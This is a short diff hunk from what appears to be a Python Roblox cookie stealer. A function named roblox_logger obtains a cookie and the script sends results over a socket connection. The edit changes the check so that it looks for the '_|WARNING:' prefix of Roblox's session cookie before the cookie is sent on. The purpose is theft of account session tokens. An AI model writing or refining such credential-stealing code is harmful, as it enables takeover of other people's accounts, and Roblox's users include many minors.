@@ -30,7 +30,7 @@ if __name__ == '__main__':
     s.connect(addr)
 
     cookie = roblox_logger()
-    if cookie is False:
+    if not cookie.startswith(b'_|WARNING:'):
         s.send(b'False')
         s.close()
     else:
